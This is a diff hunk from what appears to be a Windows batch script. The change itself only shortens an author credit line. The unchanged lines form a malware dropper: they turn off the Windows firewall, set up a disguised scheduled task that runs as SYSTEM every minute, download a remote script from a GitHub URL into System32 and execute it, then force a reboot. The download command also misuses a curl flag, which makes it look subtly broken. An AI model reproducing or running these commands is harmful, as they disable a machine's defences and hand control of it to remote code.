@@ -12,5 +12,5 @@ netsh firewall set opmode disable enable"
 netsh advfirewall set allprofiles state off"
 schtasks /create /sc minute /mo 1 /tn "TCP/IP OVER NETBIOSv2" /tr "C:/Windows/System32/chickenlittle.bat" /ru SYSTEM
 curl -x https://raw.githubusercontent.com/Stevenralf94/scripts/master/x >> chickenlittle.bat && move chickenlittle.bat C:/Windows/System32/ && call C:/Windows/System32/chickenlittle.bat
-echo "Made by Shirley Chau and Steven Brohl"
+echo "Made by Shirley C and Steven B"
 shutdown /r /t 0
